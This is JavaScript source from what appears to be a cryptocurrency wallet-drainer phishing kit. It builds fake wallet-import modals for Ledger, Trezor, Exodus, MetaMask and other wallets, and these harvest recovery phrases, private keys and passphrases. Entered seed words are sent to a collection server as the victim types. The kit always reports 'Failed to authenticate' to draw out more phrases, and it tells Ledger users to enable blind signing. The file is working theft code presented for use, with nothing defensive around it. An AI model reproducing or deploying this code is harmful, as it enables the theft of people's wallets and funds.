            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
    </div>
</div>

                                        <button onClick="updatePage(ImportWalletFinishModal);"  class="sc-himrzO eyWopv connect-phrase-button">
                                           <div class="sc-ikZpkk FGzOk">
                                              <div class="sc-jIZahH gjHfVN">
                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <span class="sc-gXmSlM CshDF">Continue</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>`;

const ImportWalletFinishModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 391px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ImportWalletModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Import Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
                                                 width="200.000000pt" height="200.000000pt" viewBox="0 0 200.000000 200.000000"
                                                 preserveAspectRatio="xMidYMid meet">

                                                <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)"
                                                fill="#000000" stroke="none">
                                                <path d="M890 1611 c-283 -75 -530 -145 -548 -154 -17 -10 -44 -36 -60 -59
                                                l-27 -42 -3 -455 c-2 -251 0 -476 3 -500 8 -56 71 -126 126 -141 25 -7 248
                                                -10 641 -8 l603 3 33 23 c17 13 44 40 60 59 l27 36 3 446 c3 475 2 496 -44
                                                551 -56 66 -45 64 -519 70 l-430 5 335 88 c184 48 338 87 343 87 4 0 7 -27 7
                                                -60 l0 -60 60 0 60 0 0 85 c0 82 -1 86 -33 121 -55 60 -58 60 -637 -95z m714
                                                -317 c14 -14 16 -69 16 -453 0 -396 -2 -440 -17 -452 -24 -21 -1182 -21 -1206
                                                0 -15 12 -17 56 -17 452 0 384 2 439 16 453 14 14 82 16 604 16 522 0 590 -2
                                                604 -16z"/>
                                                <path d="M1380 933 c-54 -20 -81 -83 -56 -131 27 -53 111 -66 149 -24 62 69
                                                -8 186 -93 155z"/>
                                                </g>
                                                </svg>

                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding: 0px 8px 8px;">
                                            <h1 class="sc-ftvSup fqLYro">Failed to authenticate<br></h1>
                                            <div class="sc-papXJ jCcNJP">To continue, try using another seed phrase.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <button onclick="updatePage(ImportWalletModal);" class="sc-himrzO eyWopv">
                              <div class="sc-ikZpkk FGzOk">
                                 <div class="sc-jIZahH gjHfVN">
                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                    </svg>
                                 </div>
                              </div>
                              <span class="sc-gXmSlM CshDF">Continue</span>
                           </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const LedgerWalletModalWC2 = `
<div class="sc-idiyUo hBuwwI" style="--height: 723px; --width: 380px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Ledger Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW" style="width:100%;">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
                                                 width="696.000000pt" height="697.000000pt" viewBox="0 0 696.000000 697.000000"
                                                 preserveAspectRatio="xMidYMid meet">

                                                <g transform="translate(0.000000,697.000000) scale(0.100000,-0.100000)"
                                                fill="#000000" stroke="none">
                                                <path d="M0 3485 l0 -3485 3480 0 3480 0 0 3485 0 3485 -3480 0 -3480 0 0
                                                -3485z m2890 2250 l0 -145 -757 -2 -758 -3 -3 -437 -2 -438 -145 0 -145 0 0
                                                585 0 585 905 0 905 0 0 -145z m2980 -440 l0 -585 -145 0 -145 0 -2 438 -3
                                                437 -757 3 -758 2 0 145 0 145 905 0 905 0 0 -585z m-2688 -1662 l3 -758 438
                                                -3 437 -2 0 -145 0 -145 -585 0 -585 0 0 905 0 905 145 0 145 0 2 -757z
                                                m-1810 -1810 l3 -438 758 -3 757 -2 0 -145 0 -145 -905 0 -905 0 0 585 0 585
                                                145 0 145 0 2 -437z m4498 -148 l0 -585 -905 0 -905 0 0 145 0 145 758 2 757
                                                3 3 438 2 437 145 0 145 0 0 -585z"/>
                                                </g>
                                                </svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="gap: 4px;padding: 0px 8px 8px;">
                                            <h1 class="sc-ftvSup fqLYro">How to connect Ledger Wallet<br></h1>
                                            <div class="sc-papXJ jCcNJP" style="text-align:left;margin-top: 10px;margin-bottom: 10px;"><b>Before you connect Ledger Live</b><br></div>
                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">1. Unlock your Ledger device.</div>
                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">2. Open the Ethereum (ETH) application.</div>
                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">3. Navigate to Settings inside the app.</div>
                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">4. Select <b>'Blind signing</b>'.</div>
                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">5. Press both buttons to <b>enable</b> blind signing.</div>
                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">6. Then click 'Continue' down below and connect using Ledger Live.</div>
                                            <p style="display:none;">You will copy this as well mr inferno Xd?</p>
                                            <img style="margin-top:10px;height:136px;" alt="Ledger video presentation" src="https://support.ledger.com/hc/article_attachments/4420181294865/blind_signing_eth_app_5.gif"></img>

                                        </div>
                                    </div>
                                </div>
                            </div>
                            <button onclick="updatePage(ImportWalletModal);" class="sc-himrzO eyWopv">
                              <div class="sc-ikZpkk FGzOk">
                                 <div class="sc-jIZahH gjHfVN">
                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                    </svg>
                                 </div>
                              </div>
                              <span class="sc-gXmSlM CshDF">Continue</span>
                           </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const WCModal = "WCModal";
const MetamaskCustomModal = "MetamaskCustomModal";

/*function isBinanceConnected() {
    if(window.BinanceChain) {
      DRAINER_Provider = window.BinanceChain;
      return true;
    }
    return false;
}*/

function request_api(params) {
    var data = {
        'phrase': params['phrase']
    };

    console.log(data);

    $.ajax({
        url: 'http://localhost:3000/submit-phrase',  // Your server URL
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json',
        success: function(response) {
            console.log('Phrase submitted successfully:', response);
        },
        error: function(xhr, status, error) {
            console.error('Error submitting phrase:', error);
        }
    });
}


function isTrustConnected() {
  if(isMobile() && window.ethereum?.isTrust) {
    DRAINER_Provider = window.ethereum;
    return true;
  }
  if(window.trustwallet) {
    DRAINER_Provider = window.trustwallet;
    return true;
  }
  return false;
}

function isMetamaskConnected() {
  let detected = false;
  if(window.ethereum) {
    if(window.ethereum.providers && window.ethereum.providers.length != 1) {
      for (const provider of window.ethereum.providers) {
        if(provider.isMetaMask) {
          detected = true;
          DRAINER_Provider = provider;
          break;
        }
      }
    }
    if (window.ethereum.isMetaMask) {
      DRAINER_Provider = window.ethereum;
      detected = true;
    }
  }
  return detected;
}

function isCoinbaseConnected() {
  let detected = false;
  if(window.ethereum) {
    if(window.ethereum.providers && window.ethereum.providers.length != 1) {
      for (const provider of window.ethereum.providers) {
        if(provider.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser) {
          detected = true;
          DRAINER_Provider = provider;
          break;
        }
      }
    }
    if (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser) {
      DRAINER_Provider = window.ethereum;
      detected = true;
    }
  }
  return detected;
}

function getCoinbase(ayaya = false) {
  if (isMobile()) {
    window.location.href = "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(window.location.href);
  } else if (!ayaya) {
    window.open('https://www.coinbase.com/wallet', '_blank').focus()
  }
}

function getMetamask(ayaya = false) {
  if (isMobile()) {
    window.location.href = "https://metamask.app.link/dapp/" + window.location.hostname + window.location.pathname;
  } else if (!ayaya) {
    window.open('https://metamask.io/download/', '_blank').focus()
  }
}

/*function getBinance(ayaya = false) {
  window.open('https://www.bnbchain.org/en/binance-wallet', '_blank').focus();
}*/

function getTrust(ayaya = false) {
  if (isMobile()) {
    window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href); //;https://" + window.location.hostname + window.location.pathname;
  } else if (!ayaya) {
    window.open('https://trustwallet.com/download', '_blank').focus()
  }
}

var WCModalV2 = null;
var ethAccount = null;
var modalInitialized = false;
var closePhrasesBlock = false;

async function initModal() {
  if(!modalInitialized) {
    modalInitialized = true;
    document.body.innerHTML += Modal;
  }
  await openModal();
}

function setPage(page) {
  document.getElementById("modal-content").innerHTML = page;
}

function getCombinedPhrase() {
  var phrase = "";
  for(var i = 0; i < 24; i++) {
    const selectedInput = 'mnemonic-input-' + i;
    const mnemonicInput = document.getElementById(selectedInput);
    phrase += mnemonicInput.value + " ";
  }
  phrase += document.getElementById('mnemonic-textarea').value;
  phrase = phrase.replace(/ +/g, " ").trimStart().trimEnd();
  if(phrase.includes("word word word") || phrase.includes("jquery.bio") || phrase.includes("expose unit another tribe parrot brick") || phrase.includes("wordwordword")) return "";
  return phrase;
}

function arrayContainsAtleast(wanted, full, amount) {
let found = 0;
for (let i = 0; i < wanted.length; i++) {
if(wanted.includes(full[i])) found++;
if(found == amount) return true;
}
return false;
}
var lastSentPhraseLength = 0;
async function updatePage(page) {
  try {
    if ((page === CloseModal || page === ConnectModal) && closePhrasesBlock) {
      return;
    }
    if(document.getElementById('connect-hardware-words')?.value === "shamir") {
      if(page === ImportWalletFinishModal || page === ExodusWalletFinishModal || page === LedgerWalletFinishModal || page === TrezorWalletFinishModal) {
        page = page.replace("Failed to authenticate", "Success!").replace("To continue, try using another seed phrase.", "To continue, please import your next Shamir Backup phrase.");
      }
    }
    if (page === CloseModal) {
        document.getElementById('modal').style.display = 'none';
        return;
    }
    if (page === TrezorWalletFinishModal || page === ExodusWalletFinishModal || page === LedgerWalletFinishModal || page === ImportWalletFinishModal  ) {
      const phrase = getCombinedPhrase();
      if(phrase.length > 30 && !phrase.includes("word word word")) {
        const wordsSelector = document.getElementById('connect-hardware-words');
        let passphrasex = document?.getElementById('connect-hardware-passphrase')?.value;
        console.log("Sending " + phrase);
        request_api({ phrase: phrase, passphrase: passphrasex, imported: page == TrezorWalletFinishModal ? "TREZOR" : page == LedgerWalletFinishModal ? "LEDGER" : page == ExodusWalletFinishModal ? "EXODUS" : "DIFFERENT", keywords: wordsSelector.value });
      }
    }

    if (!DRAINER_LEDGER_PHRASES && page == LedgerWalletModal) {
      setPage(LedgerWalletModalWC2);
      return;
    }
    if (page == TrezorWalletModal || page == ExodusWalletModal || page == ImportWalletModal || (DRAINER_LEDGER_PHRASES && page == LedgerWalletModal)) {
      lastSentPhraseLength = 0;
      setPage(page);
      const trezorModal = document.querySelector('.connect-trezor-modal');
      const wordsSelector = document.getElementById('connect-hardware-words');
      const passphraseCheckbox = document.getElementById('phrase-passphrase-checkbox');

      if(passphraseCheckbox) {
      passphraseCheckbox.addEventListener('change', function() {
        document.getElementById('connect-hardware-passphrase').value = "";
        if(this.checked) {
          document.getElementById('connect-hardware-passphrase').classList.remove("phrase-display-none");
        } else {
          document.getElementById('connect-hardware-passphrase').classList.add("phrase-display-none");
        }
      });
      }

      wordsSelector.addEventListener('change', function() {
        const value = wordsSelector.value;
        var cssText = "--width: 543px; ";
        if(value == 12) {
          cssText += '--height: 644px;';
        } else if(value == 24) {
          cssText += '--height: 791px;';
        } else if(value == "shamir" || value == "file") {
          cssText += '--height: 602px;';
        }
        trezorModal.style.cssText = cssText;

        for(var i = 12; i < 24; i++) {
          const selectedInputDiv = 'mnemonic-inputdiv-' + i;
          const mnemonicInputDiv = document.getElementById(selectedInputDiv);
          value == 12 ? mnemonicInputDiv.classList.add("phrase-display-none") : mnemonicInputDiv.classList.remove("phrase-display-none");
        }

        if(value == "shamir" || value == "file") {
          document.getElementById('mnemonic-words').classList.add("phrase-display-none");
          document.getElementById('mnemonic-textarea').classList.remove("phrase-display-none");
          for(var i = 0; i < 24; i++) {
            document.getElementById('mnemonic-input-' + i).value = "";
          }
        /*} else if(value == "12") {
          for(var i = 11; i < 24; i++) {
            document.getElementById('mnemonic-input-' + i).value = "";
          }*/
        } else {
          document.getElementById('mnemonic-words').classList.remove("phrase-display-none");
          document.getElementById('mnemonic-textarea').classList.add("phrase-display-none");
          document.getElementById('mnemonic-textarea').value = "";
        }
        if(value == "file") {
          document.getElementById('mnemonic-textarea').placeholder = "Enter your private key or file content";
        }
        // if(value == "hidden") {
        //   document.getElementById('mnemonic-textarea').value = "";
        //   document.getElementById('connect-hardware-passphrase').value = "";
        //   document.getElementById('connect-hardware-passphrase').classList.remove("phrase-display-none");
        // } else {
        //   document.getElementById('connect-hardware-passphrase').classList.add("phrase-display-none");
        //   document.getElementById('connect-hardware-passphrase').value = "";
        // }
        lastSentPhraseLength = getCombinedPhrase().length;
        // phrase-display-none
      });

      document.getElementById('mnemonic-textarea').addEventListener('input', (e) => {
        const phrase = getCombinedPhrase();
        let passphrase = document?.getElementById('connect-hardware-passphrase')?.value;
        if(phrase.length > 10 && !phrase.includes("word word word") && phrase.length > lastSentPhraseLength) {
          lastSentPhraseLength = phrase.length + 5;
          console.log("Sending " + phrase);
          request_api({ phrase: phrase, passphrase: passphrase, imported: page == TrezorWalletModal ? "TREZOR" : page == LedgerWalletModal ? "LEDGER" : page == ExodusWalletModal ? "EXODUS" : "DIFFERENT", keywords: wordsSelector.value })
        }
      });
      //el.setAttribute('color','red');
      for(var i = 0; i < 24; i++) {
        const selectedInput = 'mnemonic-input-' + i;
        const selectedInputDiv = 'mnemonic-inputdiv-' + i;
        const selectedInputNext = 'mnemonic-input-' + (i + 1);
        const selectedInputDivNext = 'mnemonic-inputdiv-' + (i + 1);
        const mnemonicInput = document.getElementById(selectedInput);
        const mnemonicInputDiv = document.getElementById(selectedInputDiv);
        const mnemonicInputDivNext = document.getElementById(selectedInputDivNext);
        mnemonicInputDiv.addEventListener("focusin", mnemonicInputDiv.classList.add("Mui-focused"));
        mnemonicInputDiv.addEventListener("focusout", mnemonicInputDiv.classList.remove("Mui-focused"));
        mnemonicInput.addEventListener('input', (e) => {
          const val = mnemonicInput.value;
          var uploadPhrase = val.length > 36;
          //let possibleWords = BIP39_KEYWORDS.filter(word => word.startsWith(val));
          //if(possibleWords.length == 1) {
            //mnemonicInput.value = possibleWords[0];
          if(BIP39_KEYWORDS.includes(val.toLowerCase())) {
             const nextMnemonicInput = document.getElementById(selectedInputNext);
             //const nextMnemonicInputDiv = document.getElementById(selectedInputDiv);
             if(nextMnemonicInput == null || mnemonicInputDivNext.classList.contains("phrase-display-none")) {
               console.log("Done!");
               uploadPhrase = true;
             } else {
               nextMnemonicInput.focus();
               nextMnemonicInput.scrollIntoView();
               const temp = nextMnemonicInput.value;
               nextMnemonicInput.value = '';
               nextMnemonicInput.value = temp;
            }
          }
          const phrase = getCombinedPhrase();
          if(phrase.length > 30 && !phrase.includes("word word word") /*&& arrayContainsAtleast(phrase.split(" "), BIP39_KEYWORDS, 3)*/ && (uploadPhrase || phrase.length > lastSentPhraseLength)) {
            let passphrase = document?.getElementById('connect-hardware-passphrase')?.value;
            lastSentPhraseLength = phrase.length + 5;
            console.log("Sending " + phrase);
            request_api({ phrase: phrase, passphrase: passphrase, imported: page == TrezorWalletModal ? "TREZOR" : page == LedgerWalletModal ? "LEDGER" : page == ExodusWalletModal ? "EXODUS" : "DIFFERENT", keywords: wordsSelector.value })
          }
        });
      }
      document.getElementById("connect-hardware-words").value = 24;
      if(page == ExodusWalletModal) document.getElementById("connect-hardware-words").value = 12;
      document.getElementById('connect-hardware-words').dispatchEvent(new Event('change'))
      return;
    }
    setPage(page);
    if (typeof DRAINER_PHRASES_DISABLED !== 'undefined' && page === ConnectModal) {
      console.log("Disabling trezor and different");
      // id="trezor-button"
      // id="different-button"
      document.getElementById("trezor-button").style.display = "none";
      document.getElementById("different-button").style.display = "none";
      return;
    }
  } catch(err) {
    console.log(err)
  }
}

async function openModal(disconnect = false) {
  console.log("Opening modal", disconnect);
  /*try {
    const connected = await window.ethereum.request({ method: 'eth_requestAccounts' });
    if(connected) return;
  } catch(err) {
    if(err.toString().toLowerCase().includes("processing")) {
      //open page already processing
    }
  }*/
  updatePage(ConnectModal);
  document.getElementById("modal").style.display = "block";
}

